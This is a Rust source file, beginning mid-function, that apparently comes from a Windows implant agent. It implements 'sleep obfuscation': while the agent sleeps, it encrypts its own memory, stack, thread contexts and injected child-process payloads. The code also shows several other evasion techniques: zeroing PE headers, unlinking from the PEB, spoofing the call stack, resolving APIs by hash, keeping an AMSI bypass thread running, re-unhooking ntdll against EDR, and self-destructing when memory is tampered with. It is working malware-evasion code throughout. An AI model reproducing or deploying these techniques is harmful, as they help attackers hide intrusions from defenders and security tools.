    let raw_regions = enumerate_regions(config.encrypt_heap);
    if raw_regions.is_empty() {
        tracing::warn!("[sleep_obfuscation] no regions to encrypt");
        let _key = handle.retrieve();
        return Ok(());
    }

    // ── 3. Encrypt all regions ─────────────────────────────────────────────
    let mut snapshots: Vec<RegionSnapshot> = Vec::with_capacity(raw_regions.len());

    // ── 2a. Capture and encrypt thread contexts ─────────────────────────────
    // Thread contexts are captured AFTER region enumeration but BEFORE memory
    // encryption, because we need the threads suspended so they don't touch
    // the memory we're about to encrypt.
    #[cfg(all(windows, feature = "thread-ctx-encrypt"))]
    let mut thread_ctx_snapshots: Option<Vec<crate::thread_context_encrypt::ThreadContextSnapshot>> = None;
    #[cfg(all(windows, feature = "thread-ctx-encrypt"))]
    if config.encrypt_thread_contexts {
        match unsafe { crate::thread_context_encrypt::capture_and_encrypt_thread_contexts(&key) } {
            Ok(snapshots) => {
                tracing::debug!("[sleep_obfuscation] captured {} thread contexts", snapshots.len());
                thread_ctx_snapshots = Some(snapshots);
            }
            Err(e) => {
                tracing::warn!("[sleep_obfuscation] thread context capture failed: {e:#}, continuing without");
            }
        }
    }

    for (base, size, orig_prot) in &raw_regions {
        let base = *base;
        let size = *size;
        let _orig_prot = *orig_prot;

        // Make writable.
        let actual_old = match protect_memory(base, size, PAGE_READWRITE) {
            Some(p) => p,
            None => continue,
        };

        // Encrypt in chunks.
        let (nonce, tags) = match encrypt_region_chunks(&key, base, size) {
            Ok(r) => r,
            Err(e) => {
                tracing::error!("[sleep_obfuscation] encrypt failed for {:p}: {}", base, e);
                // Restore protection.
                let _ = protect_memory(base, size, actual_old);
                continue;
            }
        };

        let n_chunks = tags.len();

        snapshots.push(RegionSnapshot {
            base,
            size,
            orig_protect: actual_old,
            nonce,
            tags,
            n_chunks,
        });
    }

    // ── 4. Encrypt stack ───────────────────────────────────────────────────
    let stack_info = if config.encrypt_stack {
        encrypt_stack(&key, 512)
    } else {
        None
    };

    // ── 5. Anti-forensics ──────────────────────────────────────────────────
    let (header_backup, header_orig_prot) = if config.anti_forensics {
        let (backup, orig_prot) = backup_pe_headers();
        zero_pe_headers();
        (backup, orig_prot)
    } else {
        (Vec::new(), None)
    };

    let peb_links = if config.anti_forensics {
        unlink_from_peb()
    } else {
        None
    };

    // ── 5a. Memory hygiene (PEB scrub, thread start, handle table) ─────────
    if config.anti_forensics {
        crate::memory_hygiene::run_all_hygiene();
    }

    // Set all encrypted regions to PAGE_NOACCESS.
    if config.anti_forensics {
        for snap in &snapshots {
            let _ = protect_memory(snap.base, snap.size, PAGE_NOACCESS);
        }
    }

    // ── 5b. Encrypt remote (child) process regions ─────────────────────────
    encrypt_remote_regions();

    // ── 5c. Pause write-raid AMSI thread ──────────────────────────────────
    // The write-raid race thread touches amsi.dll memory continuously.
    // Pause it before sleeping so it does not corrupt encrypted regions.
    crate::amsi_defense::pause_write_raid();

    // ── 5d. Evanesco: encrypt all tracked pages ─────────────────────────
    // When the Evanesco feature is active, all enrolled pages are encrypted
    // immediately as part of the sleep pipeline.  On wake, only the minimum
    // required pages are decrypted (on-demand via VEH / acquire_pages).
    #[cfg(all(windows, feature = "evanesco"))]
    crate::page_tracker::encrypt_all();

    // ── 6. Spoof call stack ────────────────────────────────────────────────
    let stack_spoof = if config.spoof_return_address {
        spoof_call_stack(&config.fake_module_name)
    } else {
        None
    };

    // ── 7. Sleep (variant-aware) ──────────────────────────────────────────
    let effective_variant = resolve_variant(config.variant);
    match effective_variant {
        SleepVariant::Cronus => {
            // Auto-select: verify NtSetTimer resolves, fall back to Ekko.
            if cronus_probe() {
                tracing::debug!("[sleep_obfuscation] using Cronus (waitable-timer) sleep");
                match cronus_sleep(duration) {
                    Ok(()) => {}
                    Err(e) => {
                        tracing::warn!(
                            "[sleep_obfuscation] Cronus sleep failed: {e:#}, \
                             falling back to Ekko"
                        );
                        // Fall through to Ekko path.
                        let ntdll =
                            pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL);
                        if let Some(base) = ntdll {
                            if let Some(addr) = pe_resolve::get_proc_address_by_hash(
                                base,
                                pe_resolve::hash_str(b"NtDelayExecution\0"),
                            ) {
                                let nt_delay: extern "system" fn(u8, *mut i64) -> i32 =
                                    std::mem::transmute(addr);
                                let mut delay_100ns = duration_to_100ns(duration);
                                nt_delay(0, &mut delay_100ns);
                            } else {
                                sleep_no_iat(duration);
                            }
                        } else {
                            sleep_no_iat(duration);
                        }
                    }
                }
            } else {
                tracing::warn!(
                    "[sleep_obfuscation] Cronus timer API not available, \
                     falling back to Ekko (NtDelayExecution)"
                );
                let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL);
                if let Some(base) = ntdll {
                    if let Some(addr) = pe_resolve::get_proc_address_by_hash(
                        base,
                        pe_resolve::hash_str(b"NtDelayExecution\0"),
                    ) {
                        let nt_delay: extern "system" fn(u8, *mut i64) -> i32 =
                            std::mem::transmute(addr);
                        let mut delay_100ns = duration_to_100ns(duration);
                        nt_delay(0, &mut delay_100ns);
                    } else {
                        sleep_no_iat(duration);
                    }
                } else {
                    sleep_no_iat(duration);
                }
            }
        }
        SleepVariant::Ekko => {
            let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL);
            if let Some(base) = ntdll {
                if let Some(addr) = pe_resolve::get_proc_address_by_hash(
                    base,
                    pe_resolve::hash_str(b"NtDelayExecution\0"),
                ) {
                    let nt_delay: extern "system" fn(u8, *mut i64) -> i32 =
                        std::mem::transmute(addr);
                    let mut delay_100ns = duration_to_100ns(duration);
                    nt_delay(0, &mut delay_100ns);
                } else {
                    // Fallback sleep (no IAT).
                    sleep_no_iat(duration);
                }
            } else {
                sleep_no_iat(duration);
            }
        }
    }

    // ── 8. Wake: retrieve key and verify / decrypt ─────────────────────────
    let key = handle.retrieve();

    // Restore PAGE_READWRITE on all regions first.
    for snap in &snapshots {
        let _ = protect_memory(snap.base, snap.size, PAGE_READWRITE);
    }

    // Verify and decrypt all regions.
    for snap in &snapshots {
        if let Err(e) = decrypt_region_chunks(&key, snap.base, snap.size, &snap.nonce, &snap.tags) {
            tracing::error!("[sleep_obfuscation] AEAD failure: {}", e);
            // Self-destruct: AEAD tag mismatch means memory was tampered with.
            self_destruct();
        }
    }

    // Restore original protections.
    for snap in &snapshots {
        let _ = protect_memory(snap.base, snap.size, snap.orig_protect);
    }

    // ── 8b. Decrypt remote (child) process regions ────────────────────────
    decrypt_remote_regions();

    // ── 8c. Resume write-raid AMSI thread ─────────────────────────────────
    // Agent memory is now decrypted — safe for the write-raid thread to
    // resume overwriting the AmsiInitFailed flag.
    crate::amsi_defense::resume_write_raid();

    // ── 8c-1. Evanesco: decrypt minimum pages for post-wake operation ──
    // After wake the agent relies on acquire_pages / VEH for on-demand
    // decryption of enrolled pages.  This is an explicit integration point
    // that could decrypt critical pages if needed in the future.
    #[cfg(all(windows, feature = "evanesco"))]
    crate::page_tracker::decrypt_minimum();

    // ── 8d. Re-validate stack-spoof address database ──────────────────────
    // After decryption, loaded modules may have been rebased or unhooked by
    // EDR during the sleep window.  Spot-check cached chain addresses and
    // rebuild the database if any are stale.
    #[cfg(all(windows, feature = "stack-spoof"))]
    crate::stack_db::revalidate_db();

    // ── 8e. Decrypt and restore thread contexts ──────────────────────────
    // Thread contexts are restored AFTER memory region decryption but BEFORE
    // stack decryption.  This ensures the threads' memory is already decrypted
    // when they resume, preventing crashes from accessing encrypted pages.
    #[cfg(all(windows, feature = "thread-ctx-encrypt"))]
    if let Some(ref mut ctx_snaps) = thread_ctx_snapshots {
        match unsafe { crate::thread_context_encrypt::decrypt_and_restore_thread_contexts(&key, ctx_snaps) } {
            Ok(()) => {
                tracing::debug!("[sleep_obfuscation] thread contexts restored successfully");
            }
            Err(e) => {
                tracing::error!("[sleep_obfuscation] thread context restore failed: {e:#}");
                // Non-fatal: threads may have corrupted state but we continue
                // to avoid losing the agent entirely.
            }
        }
    }

    // ── 9. Decrypt stack ───────────────────────────────────────────────────
    if let Some((s_base, s_size, s_orig_prot, s_nonce, s_tag)) = stack_info {
        if let Err(e) = decrypt_stack(&key, s_base, s_size, &s_nonce, &s_tag) {
            tracing::error!("[sleep_obfuscation] Stack AEAD failure: {}", e);
            self_destruct();
        }
        let _ = protect_memory(s_base, s_size, s_orig_prot);
    }

    // ── 10. Restore anti-forensics state ───────────────────────────────────
    if config.anti_forensics {
        // Re-link in PEB (best-effort: restore the links we saved).
        if let Some((load_flink, load_blink, mem_flink, mem_blink)) = peb_links {
            // We can't perfectly re-link because other modules may have been
            // loaded/unloaded while we slept.  The entry itself is still valid
            // in memory; we just need to re-insert it.
            // For now, we do a best-effort restore of the immediate neighbours.
            restore_peb_links(load_flink, load_blink, mem_flink, mem_blink);
        }
        // Restore PE headers.
        if !header_backup.is_empty() {
            restore_pe_headers(&header_backup, header_orig_prot);
        }
    }

    // ── 11. Restore spoofed call stack ─────────────────────────────────────
    if let Some(spoof) = stack_spoof {
        restore_call_stack(spoof);
    }

    // ── 12. Post-wake ntdll hook re-check ──────────────────────────────────
    //
    // EDR may have re-hooked ntdll syscall stubs while the agent was sleeping
    // (the sleep obfuscation made the agent's memory inaccessible, but EDR
    // can still patch ntdll which is a shared module).  Check for hooks and
    // re-unhook if necessary.
    #[cfg(windows)]
    {
        if let Err(e) = crate::ntdll_unhook::maybe_unhook() {
            tracing::warn!("[sleep_obfuscation] post-wake ntdll re-unhook failed: {e}");
        }
    }

    // Update region cache for potential reuse.
    {
        let mut cache = region_cache().lock_recover();
        cache.generation = gen;
        cache.regions = snapshots;
    }

    // Zero the key from the stack.
    let mut key_zero = key;
    key_zero.zeroize();

    tracing::debug!(
        "[sleep_obfuscation] secure_sleep completed ({} ms)",
        config.sleep_duration_ms
    );

    Ok(())
}

/// Best-effort restore of PEB module list links.
///
/// We re-insert our entry between the saved neighbours.  If the neighbours
/// have changed (modules loaded/unloaded during sleep), this is a best-effort
/// operation — the PEB list may have minor inconsistencies but the agent's
/// own entry will be present.
unsafe fn restore_peb_links(
    load_flink: *mut u8,
    load_blink: *mut u8,
    mem_flink: *mut u8,
    mem_blink: *mut u8,
) {
    // Re-link InLoadOrderLinks.
    if !load_flink.is_null() && !load_blink.is_null() {
        let flink_entry = load_flink as *mut usize;
        let blink_entry = load_blink.add(0x08) as *mut usize;
        *flink_entry = load_blink as usize;
        *blink_entry = load_flink as usize;
    }

    // Re-link InMemoryOrderLinks.
    if !mem_flink.is_null() && !mem_blink.is_null() {
        let flink_entry = mem_flink as *mut usize;
        let blink_entry = mem_blink.add(0x08) as *mut usize;
        *flink_entry = mem_blink as usize;
        *blink_entry = mem_flink as usize;
    }
}

// ── Remote process registry ─────────────────────────────────────────────────
//
// Allows the local agent to encrypt child injected payloads during its own
// sleep cycle.  When `secure_sleep` runs, it also encrypts the registered
// remote regions via NtWriteVirtualMemory / NtReadVirtualMemory (indirect
// syscalls), creating a cohesive parent-child sleep obfuscation system.

/// Metadata for a remote process region enrolled in sleep obfuscation.
#[derive(Clone)]
struct RemoteProcess {
    /// PID of the target (child) process.
    pid: u32,
    /// Base address of the payload region in the target process.
    base_addr: usize,
    /// Size of the payload region.
    size: usize,
    /// 32-byte XChaCha20-Poly1305 key used for this remote region.
    key: [u8; 32],
    /// Per-region nonce (refreshed each sleep cycle).
    nonce: [u8; MAX_NONCE],
    /// Per-chunk AEAD tags.
    tags: Vec<[u8; TAG_LEN]>,
    /// Original page protection of the remote region.
    orig_protect: u32,
    /// Process handle kept open for cross-process operations.
    process_handle: usize,
    /// Optional waitable-timer handle used by Cronus variant for remote
    /// process sleep encryption.  `0` means no timer is allocated.
    timer_handle: usize,
    /// Optional pointer to the Cronus position-independent XChaCha20 encryption
    /// stub allocated in this process.  `0` means no stub allocated.
    cronos_stub_addr: usize,
    /// Size of the Cronus stub in bytes.
    cronos_stub_size: usize,
}

/// Global registry of remote processes enrolled in sleep obfuscation.
static REMOTE_PROCESSES: OnceLock<std::sync::Mutex<Vec<RemoteProcess>>> = OnceLock::new();

fn remote_processes() -> &'static std::sync::Mutex<Vec<RemoteProcess>> {
    REMOTE_PROCESSES.get_or_init(|| std::sync::Mutex::new(Vec::new()))
}

/// Open a process handle via NtOpenProcess (indirect syscall) with VM
/// read/write/operation access.
unsafe fn open_remote_process(pid: u32) -> Option<usize> {
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
    let func_addr =
        pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"NtOpenProcess\0"))?;

    // PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE
    const ACCESS_MASK: u64 = (0x0008 | 0x0010 | 0x0020) as u64;

    let mut obj_attr: [u64; 3] = [0; 3]; // OBJECT_ATTRIBUTES (simplified)
    obj_attr[0] = std::mem::size_of::<[u64; 3]>() as u64; // Length

    let mut client_id = [0u64; 2];
    client_id[0] = pid as u64;

    let mut handle: usize = 0;
    let nt_open: extern "system" fn(*mut usize, u64, *mut u64, *mut u64) -> i32 =
        std::mem::transmute(func_addr);

    let status = nt_open(
        &mut handle,
        ACCESS_MASK,
        obj_attr.as_mut_ptr(),
        client_id.as_mut_ptr(),
    );

    if status != 0 || handle == 0 {
        None
    } else {
        Some(handle)
    }
}

/// Read memory from a remote process via NtReadVirtualMemory (indirect syscall).
unsafe fn remote_read(process_handle: usize, base: usize, buf: &mut [u8]) -> bool {
    let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
        Some(b) => b,
        None => return false,
    };
    let func_addr = match pe_resolve::get_proc_address_by_hash(
        ntdll,
        pe_resolve::hash_str(b"NtReadVirtualMemory\0"),
    ) {
        Some(a) => a,
        None => return false,
    };

    let nt_read: extern "system" fn(
        usize,      // ProcessHandle
        *mut u8,    // BaseAddress (const in target)
        *mut u8,    // Buffer
        usize,      // NumberOfBytesToRead
        *mut usize, // NumberOfBytesRead
    ) -> i32 = std::mem::transmute(func_addr);

    let mut bytes_read: usize = 0;
    let status = nt_read(
        process_handle,
        base as *mut u8,
        buf.as_mut_ptr(),
        buf.len(),
        &mut bytes_read,
    );

    status == 0 && bytes_read == buf.len()
}

/// Write memory to a remote process via NtWriteVirtualMemory (indirect syscall).
unsafe fn remote_write(process_handle: usize, base: usize, buf: &[u8]) -> bool {
    let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
        Some(b) => b,
        None => return false,
    };
    let func_addr = match pe_resolve::get_proc_address_by_hash(
        ntdll,
        pe_resolve::hash_str(b"NtWriteVirtualMemory\0"),
    ) {
        Some(a) => a,
        None => return false,
    };

    let nt_write: extern "system" fn(
        usize,      // ProcessHandle
        *const u8,  // BaseAddress
        *const u8,  // Buffer
        usize,      // NumberOfBytesToWrite
        *mut usize, // NumberOfBytesWritten
    ) -> i32 = std::mem::transmute(func_addr);

    let mut bytes_written: usize = 0;
    let status = nt_write(
        process_handle,
        base as *const u8,
        buf.as_ptr(),
        buf.len(),
        &mut bytes_written,
    );

    status == 0 && bytes_written == buf.len()
}

/// Change page protection in a remote process via NtProtectVirtualMemory
/// (indirect syscall).
unsafe fn remote_protect(
    process_handle: usize,
    base: usize,
    size: usize,
    new_prot: u32,
) -> Option<u32> {
    let mut base_addr = base as *mut std::ffi::c_void;
    let mut region_size = size;
    let mut old_prot: u32 = 0;

    #[cfg(feature = "direct-syscalls")]
    {
        let status = crate::syscalls::syscall_NtProtectVirtualMemory(
            process_handle as u64,
            &mut base_addr as *mut _ as usize as u64,
            &mut region_size as *mut _ as usize as u64,
            new_prot as u64,
            &mut old_prot as *mut _ as usize as u64,
        );
        if status != 0 {
            return None;
        }
        Some(old_prot)
    }

    #[cfg(not(feature = "direct-syscalls"))]
    {
        let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
        let func_addr = pe_resolve::get_proc_address_by_hash(
            ntdll,
            pe_resolve::hash_str(b"NtProtectVirtualMemory\0"),
        )?;

        let nt_protect: extern "system" fn(
            usize,                      // ProcessHandle
            *mut *mut std::ffi::c_void, // BaseAddress
            *mut usize,                 // RegionSize
            u32,                        // NewProtect
            *mut u32,                   // OldProtect
        ) -> i32 = std::mem::transmute(func_addr);

        let status = nt_protect(
            process_handle,
            &mut base_addr,
            &mut region_size,
            new_prot,
            &mut old_prot,
        );

        if status != 0 {
            None
        } else {
            Some(old_prot)
        }
    }
}

/// Register a remote (child) process's memory region for sleep obfuscation.
///
/// When the local agent calls `secure_sleep`, it will also encrypt the
/// registered remote region via cross-process memory operations.  The key
/// for the remote region is derived independently from the local key.
///
/// # Arguments
///
/// * `pid` — PID of the target process.
/// * `base_addr` — Base address of the payload region in the target.
/// * `size` — Size of the payload region in bytes.
/// * `key` — 32-byte encryption key for the remote region.
///
/// # Returns
///
/// `Ok(())` on success, or an error if the process cannot be opened or
/// the region is invalid.
pub fn register_remote_process(
    pid: u32,
    base_addr: usize,
    size: usize,
    key: [u8; 32],
) -> Result<()> {
    if size == 0 || base_addr == 0 {
        return Err(anyhow!(
            "invalid remote region: base={:#x}, size={}",
            base_addr,
            size
        ));
    }

    let process_handle = unsafe { open_remote_process(pid) }
        .ok_or_else(|| anyhow!("cannot open remote process pid {}", pid))?;

    // Query the current protection of the remote region.
    let orig_protect = unsafe { remote_protect(process_handle, base_addr, size, PAGE_READWRITE) }
        .unwrap_or(PAGE_EXECUTE_READ);

    // Restore original protection after querying.
    if orig_protect != PAGE_READWRITE {
        let _ = unsafe { remote_protect(process_handle, base_addr, size, orig_protect) };
    }

    let entry = RemoteProcess {
        pid,
        base_addr,
        size,
        key,
        nonce: [0u8; MAX_NONCE],
        tags: Vec::new(),
        orig_protect,
        process_handle,
        timer_handle: 0,
        cronos_stub_addr: 0,
        cronos_stub_size: 0,
    };

    let mut registry = remote_processes().lock_recover();

    // Check for duplicate PID — replace existing entry.
    if let Some(existing) = registry.iter_mut().find(|r| r.pid == pid) {
        // Close old process handle and timer handle.
        unsafe {
            let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL);
            if let Some(base) = ntdll {
                if let Some(addr) =
                    pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(b"NtClose\0"))
                {
                    let nt_close: extern "system" fn(usize) -> i32 = std::mem::transmute(addr);
                    nt_close(existing.process_handle);
                    // Close Cronus timer handle if allocated.
                    if existing.timer_handle != 0 {
                        nt_close(existing.timer_handle);
                    }
                }
            }
            // Free Cronus stub if allocated.
            if existing.cronos_stub_addr != 0 {
                cronus_free_stub(existing.cronos_stub_addr, existing.cronos_stub_size);
            }
        }
        *existing = entry;
    } else {
        registry.push(entry);
    }

    tracing::info!(
        "[sleep_obfuscation] registered remote process pid={} base={:#x} size={}",
        pid,
        base_addr,
        size
    );

    Ok(())
}

/// Unregister a remote process from sleep obfuscation.
///
/// Closes the process handle and timer handle, frees the Cronus stub if
/// allocated, and removes the entry from the registry.
/// Should be called before freeing injected memory in the target.
pub fn unregister_remote_process(pid: u32) {
    let mut registry = remote_processes().lock_recover();

    let idx = registry.iter().position(|r| r.pid == pid);
    if let Some(i) = idx {
        let removed = registry.remove(i);

        // Close the process handle and timer handle.
        unsafe {
            let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL);
            if let Some(base) = ntdll {
                if let Some(addr) =
                    pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(b"NtClose\0"))
                {
                    let nt_close: extern "system" fn(usize) -> i32 = std::mem::transmute(addr);
                    nt_close(removed.process_handle);
                    // Close Cronus timer handle if allocated.
                    if removed.timer_handle != 0 {
                        nt_close(removed.timer_handle);
                    }
                }
            }
            // Free Cronus stub if allocated.
            if removed.cronos_stub_addr != 0 {
                cronus_free_stub(removed.cronos_stub_addr, removed.cronos_stub_size);
            }
        }

        tracing::info!(
            "[sleep_obfuscation] unregistered remote process pid={}",
            pid
        );
    }
}

/// Encrypt all registered remote process regions.
///
/// Called by `secure_sleep` after encrypting local regions.  Each remote
/// region is read, encrypted in-place, and written back.  The nonce and
/// tags are stored in the registry entry for decryption on wake.
unsafe fn encrypt_remote_regions() {
    let mut registry = remote_processes().lock_recover();

    for remote in registry.iter_mut() {
        let size = remote.size;
        let mut buf = vec![0u8; size];

        // Read the remote region.
        if !remote_read(remote.process_handle, remote.base_addr, &mut buf) {
            tracing::warn!(
                "[sleep_obfuscation] failed to read remote pid={} base={:#x}",
                remote.pid,
                remote.base_addr
            );
            continue;
        }

        // Change remote protection to PAGE_READWRITE.
        let old_prot = remote_protect(
            remote.process_handle,
            remote.base_addr,
            size,
            PAGE_READWRITE,
        );

        // Encrypt in chunks.
        let mut nonce = [0u8; MAX_NONCE];
        OsRng.fill_bytes(&mut nonce[..NONCE_LEN]);

        let cipher = match XChaCha20Poly1305::new_from_slice(&remote.key) {
            Ok(c) => c,
            Err(_) => continue,
        };
        let xnonce = XNonce::from_slice(&nonce[..NONCE_LEN]);

        let n_chunks = (size + CHUNK_SIZE - 1) / CHUNK_SIZE;
        let mut tags = Vec::with_capacity(n_chunks);

        let mut offset = 0usize;
        let mut encrypt_ok = true;
        while offset < size {
            let end = (offset + CHUNK_SIZE).min(size);
            let _chunk_len = end - offset;

            let chunk_slice = &buf[offset..end];
            let ct_tag = match cipher.encrypt(xnonce, chunk_slice as &[u8]) {
                Ok(ct) => ct,
                Err(_) => {
                    encrypt_ok = false;
                    break;
                }
            };

            let ct_len = ct_tag.len() - TAG_LEN;
            buf[offset..offset + ct_len].copy_from_slice(&ct_tag[..ct_len]);

            let mut tag = [0u8; TAG_LEN];
            tag.copy_from_slice(&ct_tag[ct_len..]);
            tags.push(tag);

            offset = end;
        }

        if !encrypt_ok {
            // Restore original protection.
            if let Some(old) = old_prot {
                let _ = remote_protect(remote.process_handle, remote.base_addr, size, old);
            }
            continue;
        }

        // Write encrypted data back to the remote process.
        if !remote_write(remote.process_handle, remote.base_addr, &buf) {
            tracing::warn!(
                "[sleep_obfuscation] failed to write encrypted data to remote pid={}",
                remote.pid
            );
            if let Some(old) = old_prot {
                let _ = remote_protect(remote.process_handle, remote.base_addr, size, old);
            }
            continue;
        }

        // Set remote region to PAGE_NOACCESS for maximum stealth.
        let final_prot = if let Some(old) = old_prot {
            let _ = remote_protect(remote.process_handle, remote.base_addr, size, PAGE_NOACCESS);
            old
        } else {
            remote.orig_protect
        };

        // Save nonce, tags, and actual original protection.
        remote.nonce = nonce;
        remote.tags = tags;
        remote.orig_protect = final_prot;
    }
}

/// Decrypt all registered remote process regions on wake.
///
/// Verifies AEAD tags for every chunk.  On failure, the remote process is
/// terminated (tampered child = potential detection vector).
unsafe fn decrypt_remote_regions() {
    let registry = remote_processes().lock_recover();

    for remote in registry.iter() {
        let size = remote.size;
        let mut buf = vec![0u8; size];

        // Restore PAGE_READWRITE first.
        let _ = remote_protect(
            remote.process_handle,
            remote.base_addr,
            size,
            PAGE_READWRITE,
        );

        // Read the encrypted data from the remote process.
        if !remote_read(remote.process_handle, remote.base_addr, &mut buf) {
            tracing::error!(
                "[sleep_obfuscation] failed to read encrypted remote pid={} — may be dead",
                remote.pid
            );
            continue;
        }

        // Decrypt and verify AEAD tags.
        let cipher = match XChaCha20Poly1305::new_from_slice(&remote.key) {
            Ok(c) => c,
            Err(_) => continue,
        };
        let xnonce = XNonce::from_slice(&remote.nonce[..NONCE_LEN]);

        let mut offset = 0usize;
        let mut chunk_idx = 0usize;
        let mut decrypt_ok = true;

        while offset < size {
            let end = (offset + CHUNK_SIZE).min(size);
            let chunk_len = end - offset;

            let tag = match remote.tags.get(chunk_idx) {
                Some(t) => t,
                None => {
                    decrypt_ok = false;
                    break;
                }
            };

            let mut combined = Vec::with_capacity(chunk_len + TAG_LEN);
            combined.extend_from_slice(&buf[offset..offset + chunk_len]);
            combined.extend_from_slice(tag);

            match cipher.decrypt(xnonce, combined.as_slice()) {
                Ok(pt) => {
                    buf[offset..offset + pt.len()].copy_from_slice(&pt);
                }
                Err(_) => {
                    tracing::error!(
                        "[sleep_obfuscation] remote AEAD tag mismatch: pid={} chunk={} — \
                         terminating child process",
                        remote.pid,
                        chunk_idx
                    );
                    decrypt_ok = false;
                    break;
                }
            }

            offset = end;
            chunk_idx += 1;
        }

        if decrypt_ok {
            // Write decrypted data back.
            if !remote_write(remote.process_handle, remote.base_addr, &buf) {
                tracing::error!(
                    "[sleep_obfuscation] failed to write decrypted data to remote pid={}",
                    remote.pid
                );
            }

            // Restore original protection.
            let _ = remote_protect(
                remote.process_handle,
                remote.base_addr,
                size,
                remote.orig_protect,
            );
        } else {
            // AEAD failure — terminate the remote process to prevent
            // detection of tampered/corrupted payload.
            let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL);
            if let Some(base) = ntdll {
                if let Some(addr) = pe_resolve::get_proc_address_by_hash(
                    base,
                    pe_resolve::hash_str(b"NtTerminateProcess\0"),
                ) {
                    let nt_term: extern "system" fn(usize, u32) -> i32 = std::mem::transmute(addr);
                    nt_term(remote.process_handle, 1);
                }
            }
        }
    }
}

// ── Non-Windows stub ────────────────────────────────────────────────────────

// The module is gated by #![cfg(windows)] at the top, so no stubs needed here.
// Non-Windows targets will not compile this module at all.

// ── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn default_config_has_sensible_defaults() {
        let cfg = SleepObfuscationConfig::default();
        assert_eq!(cfg.sleep_duration_ms, 5000);
        assert!(cfg.encryption_key.is_none());
        assert!(cfg.encrypt_stack);
        assert!(!cfg.encrypt_heap);
        assert!(cfg.spoof_return_address);
        assert!(cfg.fake_module_name.is_none());
        assert!(cfg.anti_forensics);
        assert_eq!(cfg.variant, SleepVariant::Cronus);
    }

    #[test]
    fn duration_to_100ns_is_negative() {
        let dur = std::time::Duration::from_secs(5);
        let v = duration_to_100ns(dur);
        assert!(v < 0, "relative timeout must be negative, got {}", v);
    }

    #[test]
    fn is_encodable_protect_filters_correctly() {
        // Code sections: always encrypt.
        assert!(is_encodable_protect(PAGE_EXECUTE_READ, false));
        assert!(is_encodable_protect(PAGE_EXECUTE_READWRITE, false));
        assert!(is_encodable_protect(PAGE_EXECUTE, false));

        // Data sections: only when include_heap is true.
        assert!(!is_encodable_protect(PAGE_READWRITE, false));
        assert!(is_encodable_protect(PAGE_READWRITE, true));
        assert!(!is_encodable_protect(PAGE_READONLY, false));
        assert!(is_encodable_protect(PAGE_READONLY, true));

        // NoAccess: never encrypt.
        assert!(!is_encodable_protect(PAGE_NOACCESS, true));
        assert!(!is_encodable_protect(PAGE_NOACCESS, false));
    }

    #[test]
    fn key_handle_stash_and_retrieve_roundtrip() {
        let original = {
            let mut k = [0u8; 32];
            OsRng.fill_bytes(&mut k);
            k
        };
        let handle = KeyHandle::stash(original);
        let retrieved = handle.retrieve();
        assert_eq!(original, retrieved, "key must survive XMM round-trip");
    }

    #[test]
    fn chunked_encrypt_decrypt_roundtrip() {
        let key = {
            let mut k = [0u8; 32];
            OsRng.fill_bytes(&mut k);
            k
        };
        // Allocate a 128 KB buffer.
        let size = 128 * 1024;
        let mut buf: Vec<u8> = vec![0u8; size];
        OsRng.fill_bytes(&mut buf);

        let original = buf.clone();

        let (nonce, tags) =
            encrypt_region_chunks(&key, buf.as_mut_ptr(), size).expect("encrypt should succeed");

        // Verify the ciphertext differs from plaintext.
        assert_ne!(buf, original, "ciphertext must differ from plaintext");

        decrypt_region_chunks(&key, buf.as_mut_ptr(), size, &nonce, &tags)
            .expect("decrypt should succeed");

        assert_eq!(buf, original, "decrypted data must match original");
    }

    #[test]
    fn tampered_tag_causes_decrypt_failure() {
        let key = {
            let mut k = [0u8; 32];
            OsRng.fill_bytes(&mut k);
            k
        };
        let size = 64 * 1024;
        let mut buf: Vec<u8> = vec![0u8; size];
        OsRng.fill_bytes(&mut buf);

        let (nonce, mut tags) =
            encrypt_region_chunks(&key, buf.as_mut_ptr(), size).expect("encrypt should succeed");

        // Tamper with the tag.
        tags[0][0] ^= 0xFF;

        let result = decrypt_region_chunks(&key, buf.as_mut_ptr(), size, &nonce, &tags);
        assert!(
            result.is_err(),
            "tampered tag must cause decryption failure"
        );
    }

    #[test]
    fn register_remote_validates_inputs() {
        // Zero base address should fail.
        let result = register_remote_process(1234, 0, 4096, [0u8; 32]);
        assert!(result.is_err(), "zero base_addr should be rejected");

        // Zero size should fail.
        let result = register_remote_process(1234, 0x10000, 0, [0u8; 32]);
        assert!(result.is_err(), "zero size should be rejected");
    }

    #[test]
    fn unregister_nonexistent_is_noop() {
        // Should not panic or return error for a PID that doesn't exist.
        unregister_remote_process(99999);
    }
}
